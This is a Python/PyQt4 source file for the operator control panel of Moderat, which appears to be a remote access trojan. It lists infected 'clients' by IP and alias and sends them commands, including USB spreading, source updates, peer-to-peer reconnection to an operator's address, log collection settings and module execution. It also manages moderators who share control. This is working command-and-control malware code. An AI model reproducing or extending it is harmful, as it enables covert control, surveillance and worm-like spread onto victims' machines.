# coding=utf-8
from PyQt4.QtGui import *
import string
import random

from libs.moderat import Clients
from libs.moderat.Decorators import *
from libs.log_settings import LogSettings
from libs.dialogs import login, message, text, p2p
import Module


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class Actions:
    def __init__(self, moderat):
        self.moderat = moderat
        self.clients = Clients.Clients(self.moderat)
        self.modules = {}

        # Create Main UI Functions
        self.ui = self.moderat.ui
        self.ui.disable_administrator()

    def login(self):
        ok, credentials = login.get(self.moderat)
        if ok:
            self.moderat.session_id = id_generator()
            username = credentials['username']
            password = credentials['password']
            self.moderat.moderator.send_msg('auth %s %s' % (username, password), 'moderatorInitializing',
                                            session_id=self.moderat.session_id)
            self.moderat.username = username
        else:
            self.disconnect()

    def disconnect(self):
        '''
        disconnected from server
        :return:
        '''
        # Stop Clients Checker
        if self.moderat.clients_checker:
            if self.moderat.clients_checker.isActive():
                self.moderat.clients_checker.stop()
        # Stop Moderators Checker
        if self.moderat.moderators_checker:
            if self.moderat.moderators_checker.isActive():
                self.moderat.moderators_checker.stop()
        # Stop Connection
        try:
            self.moderat.connection.disconnect()
        except AttributeError:
            pass
        # Update GUI
        self.ui.on_moderator_not_connected()
        self.ui.clear_tables()

        self.ui.disable_administrator()

    def get_clients(self):
        self.moderat.moderator.send_msg(message='getClients', mode='getClients', session_id=self.moderat.session_id)

    @client_is_selected
    def set_alias(self):
        current_clients = self.current_client()
        client, alias, ip_address, p2p_mode = current_clients[0]
        ok, value = text.get(self.moderat,
                             self.moderat.MString('ALIAS_SET'), self.moderat.MString('ALIAS_NAME'), self.moderat.MString('ALIAS_NAME'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'),
                             value=alias)
        for index, client_args in enumerate(current_clients):
            client, alias, ip_address, p2p_mode = client_args
            final_value = value if index == 0 or len(value) == 0 else value + '_{}'.format(index)
            if client and ok:
                self.moderat.moderator.send_msg('%s %s' % (client, final_value), 'setAlias',
                                                session_id=self.moderat.session_id)

    @client_is_selected
    def remove_client(self):
        reply = QMessageBox.question(self.moderat, self.moderat.MString('ADMINISTRATION_QUESTION_REMOVE'),
                                     self.moderat.MString('ADMINISTRATION_QUESTION_REMOVE'), QMessageBox.Yes, QMessageBox.No)
        if reply == QMessageBox.Yes:
            for client_args in self.current_client():
                client, alias, ip_address, p2p_mode = client_args
                if client:
                    self.moderat.moderator.send_msg('%s' % client, 'removeClient', session_id=self.moderat.session_id)

    @client_is_selected
    def send_p2p_start(self):
        current_clients = self.current_client()
        client, alias, ip_address, p2p_mode = current_clients[0]
        ok, credentials = p2p.get(self.moderat, alias)
        if ok:
            for client_args in current_clients:
                client, alias, ip_address, p2p_mode = client_args
                if client:
                    self.moderat.moderator.send_msg('startP2p%SPLITTER%{}%SPLITTER%{}%SPLITTER%{}'.format(
                        credentials['ip_address'],
                        credentials['port'],
                        credentials['message'] if len(credentials['message'].split()) > 0 else ' '),
                        mode='p2pMode',
                        session_id=self.moderat.session_id,
                        _to=client,
                        module_id='')

    @client_is_selected
    def set_log_settings(self):
        self.settings_windows = {}
        for client_args in self.current_client():
            client, alias, ip_address, p2p_mode = client_args
            if client:
                module_id = id_generator()
                client_config = self.clients.get_client(client)
                client_config['moderat'] = self.moderat
                client_config['client'] = client
                client_config['alias'] = alias
                client_config['ip_address'] = ip_address
                client_config['p2p'] = p2p_mode
                self.settings_windows[module_id] = LogSettings(client_config)
                self.settings_windows[module_id].show()

    @client_is_selected
    def update_source(self):
        for client_args in self.current_client():
            client, alias, ip_address, p2p_mode = client_args
            if client:
                self.moderat.moderator.send_msg('updateSource', 'updateSource', session_id=self.moderat.session_id,
                                                _to=client, module_id='')

    @client_is_selected
    def usb_spreading(self):
        for client_args in self.current_client():
            client, alias, ip_address, p2p_mode = client_args
            if client:
                self.moderat.moderator.send_msg('usbSpreading', 'usbSpreading', session_id=self.moderat.session_id,
                                                _to=client, module_id='')

    def signal_received(self, data):
        # TODO: TEMP
        for i in self.modules.keys():
            if self.modules[i].widgets.has_key(data['module_id']):
                self.modules[i].widgets[data['module_id']].signal(data)

    @client_is_selected
    def execute_module(self, module=None):
        for client_args in self.current_client():
            client, alias, ip_address, p2p_mode = client_args
            if client:
                args = {
                    'moderat': self.moderat,
                    'client': client,
                    'alias': alias,
                    'ip_address': ip_address,
                    'p2p': p2p_mode
                }
                if not self.modules.has_key(client):
                    self.modules[client] = Module.Executer(args, module)
                    self.modules[client].closeEvent = lambda x: self.module_closed(client)
                    self.modules[client].show()
                else:
                    self.modules[client].raise_()

    def module_closed(self, module_id):
        if self.modules.has_key(module_id):
            del self.modules[module_id]

    def current_client(self):
        tab_index = self.moderat.clientsTabs.currentIndex()
        if tab_index == 0:
            selected_rows = sorted(self.moderat.clientsTable.selectionModel().selectedRows())
            payload = []
            for index in selected_rows:
                try:
                    payload.append((
                        str(self.moderat.clientsTable.item(index.row(), 1).text()),
                        unicode(self.moderat.clientsTable.item(index.row(), 3).text()),
                        str(self.moderat.clientsTable.item(index.row(), 0).text()),
                        False
                    ))
                except AttributeError:
                    pass
            return payload
        elif tab_index == 1:
            selected_rows = sorted(self.moderat.directClientsTable.selectionModel().selectedRows())
            payload = []
            for index in selected_rows:
                try:
                    payload.append((
                        str(self.moderat.directClientsTable.item(index.row(), 1).text()),
                        unicode(self.moderat.directClientsTable.item(index.row(), 2).text()),
                        str(self.moderat.directClientsTable.item(index.row(), 0).text()),
                        True,
                    ))
                except AttributeError:
                    pass
            return payload
        elif tab_index == 2:
            selected_rows = sorted(self.moderat.offlineClientsTable.selectionModel().selectedRows())
            payload = []
            for index in selected_rows:
                try:
                    payload.append((
                        str(self.moderat.offlineClientsTable.item(index.row(), 1).text()),
                        unicode(self.moderat.offlineClientsTable.item(index.row(), 2).text()),
                        str(self.moderat.offlineClientsTable.item(index.row(), 3).text()),
                        False
                    ))
                except AttributeError:
                    pass
            return payload
        elif tab_index == 3:
            selected_rows = sorted(self.moderat.moderatorsTable.selectionModel().selectedRows())
            payload = []
            for index in selected_rows:
                try:
                    payload.append(
                        str(self.moderat.moderatorsTable.item(self.moderat.moderatorsTable.currentRow(), 0).text()))
                except AttributeError:
                    pass
            return payload

    def close_moderat(self):
        # Stop Clients Checker
        if self.moderat.clients_checker:
            if self.moderat.clients_checker.isActive():
                self.moderat.clients_checker.stop()
        # Stop Moderators Checker
        if self.moderat.moderators_checker:
            if self.moderat.moderators_checker.isActive():
                self.moderat.moderators_checker.stop()

    # Administrators
    @client_is_selected
    def administrator_set_moderator(self):
        ok, value = text.get(self.moderat,
                             self.moderat.MString('SET_MODERATOR_TITLE'), self.moderat.MString('SET_MODERATOR_USERNAME'),
                             self.moderat.MString('SET_MODERATOR_USERNAME'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'))
        for client_args in self.current_client():
            client, alias, ip_address, p2p_mode = client_args
            if client and ok:
                self.moderat.moderator.send_msg('%s %s' % (client, value), 'setModerator',
                                                session_id=self.moderat.session_id, _to=client)

    def administrator_get_moderators(self):
        self.moderat.moderator.send_msg(message='getModerators', mode='getModerators',
                                        session_id=self.moderat.session_id)

    def administrator_create_moderator(self):
        # Get Username
        username, ok = QInputDialog.getText(self.moderat,
                                            self.moderat.MString('ADMINISTRATION_INPUT_USERNAME'),
                                            self.moderat.MString('ADMINISTRATION_USERNAME'),
                                            QLineEdit.Normal)
        if ok and len(str(username)) > 0:
            username = str(username)
            # Get Password
            password, ok = QInputDialog.getText(self.moderat,
                                                self.moderat.MString('ADMINISTRATION_INPUT_PASSWORD'),
                                                self.moderat.MString('ADMINISTRATION_PASSWORD'),
                                                QLineEdit.Password)
            if ok and len(str(password)) > 3:
                password = str(password)
                # Get Privileges
                privileges, ok = QInputDialog.getItem(self.moderat, self.moderat.MString('ADMINISTRATION_INPUT_PRIVS'),
                                                      self.moderat.MString('ADMINISTRATION_PRIVS'), ('0', '1'), 0, False)
                admin = str(privileges)
                if ok and privileges:
                    self.moderat.moderator.send_msg('%s %s %s' % (username, password, admin), 'addModerator',
                                                    session_id=self.moderat.session_id)
                else:
                    message.error(self.moderat,
                                  self.moderat.MString('ADMINISTRATION_INCORRECT_PRIVILEGES'),
                                  self.moderat.MString('ADMINISTRATION_INCORRECT_PRIVILEGES'))
                    return
            else:
                message.error(self.moderat,
                              self.moderat.MString('ADMINISTRATION_INCORRECT_PASSWORD'),
                              self.moderat.MString('ADMINISTRATION_INCORRECT_PASSWORD'))
                return
        else:
            message.error(self.moderat,
                          self.moderat.MString('ADMINISTRATION_INCORRECT_USERNAME'),
                          self.moderat.MString('ADMINISTRATION_INCORRECT_USERNAME'))
            return

    def administrator_change_moderator_password(self):
        for moderator_args in self.current_client():
            moderator = moderator_args
            ok, password = text.get_password(self.moderat,
                                             self.moderat.MString('ADMINISTRATION_INPUT_PASSWORD'), self.moderat.MString('ADMINISTRATION_PASSWORD'),
                                             self.moderat.MString('ADMINISTRATION_PASSWORD'),
                                             self.moderat.MString('DIALOG_OK'),
                                             self.moderat.MString('DIALOG_CANCEL'))
            if ok and len(str(password)) > 3:
                password1 = str(password)
                ok, password = text.get_password(self.moderat.MString('ADMINISTRATION_INPUT_PASSWORD'), self.moderat.MString('ADMINISTRATION_PASSWORD'),
                                                 self.moderat.MString('ADMINISTRATION_PASSWORD'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'))
                if ok and len(str(password)) > 3:
                    password2 = str(password)

                    if password1 == password2:
                        self.moderat.moderator.send_msg('%s %s' % (moderator, password1), 'changePassword',
                                                        session_id=self.moderat.session_id)
                    else:
                        message.error(self.moderat,
                                      self.moderat.MString('ADMINISTRATION_PASSWORD_NOT_MATCH'),
                                      self.moderat.MString('ADMINISTRATION_PASSWORD_NOT_MATCH'))
                        return
                # if not password
                else:
                    message.error(self.moderat,
                                  self.moderat.MString('ADMINISTRATION_INCORRECT_PASSWORD'),
                                  self.moderat.MString('ADMINISTRATION_INCORRECT_PASSWORD'))
                    return
            else:
                message.error(self.moderat,
                              self.moderat.MString('ADMINISTRATION_INCORRECT_PASSWORD'),
                              self.moderat.MString('ADMINISTRATION_INCORRECT_PASSWORD'))
                return

    def administrator_change_moderator_privilege(self):
        for moderator_args in self.current_client():
            moderator = moderator_args
            privileges, ok = QInputDialog.getItem(self.moderat, self.moderat.MString('ADMINISTRATION_INPUT_PRIVS'),
                                                  self.moderat.MString('ADMINISTRATION_PRIVS'),
                                                  ('0', '1'), 0, False)
            admin = str(privileges)
            if ok and privileges:
                self.moderat.moderator.send_msg('%s %s' % (moderator, admin), 'changePrivilege',
                                                session_id=self.moderat.session_id)

    def administrator_remove_moderator(self):
        for moderator_args in self.current_client():
            moderator = moderator_args
            reply = QMessageBox.question(self.moderat, self.moderat.MString('ADMINISTRATION_QUESTION_REMOVE'),
                                         self.moderat.MString('ADMINISTRATION_QUESTION_REMOVE'),
                                         QMessageBox.Yes, QMessageBox.No)
            if reply == QMessageBox.Yes:
                self.moderat.moderator.send_msg('%s' % moderator, 'removeModerator',
                                                session_id=self.moderat.session_id)

    @update_clients
    def filter_by_ip_address(self):
        clients = self.current_client()
        if len(clients) > 0:
            self.moderat.filters['ip_address'] = clients[0][2]

    @update_clients
    def filter_by_alias(self):
        clients = self.current_client()
        if len(clients) > 0:
            self.moderat.filters['alias'] = clients[0][1]

    @update_clients
    def filter_by_moderator(self):
        clients = self.current_client()
        if len(clients) > 0:
            self.moderat.filters['moderator'] = self.moderat.clients[clients[0][0]]['moderator'] \
                if self.moderat.clients.has_key(clients[0][0]) else ''
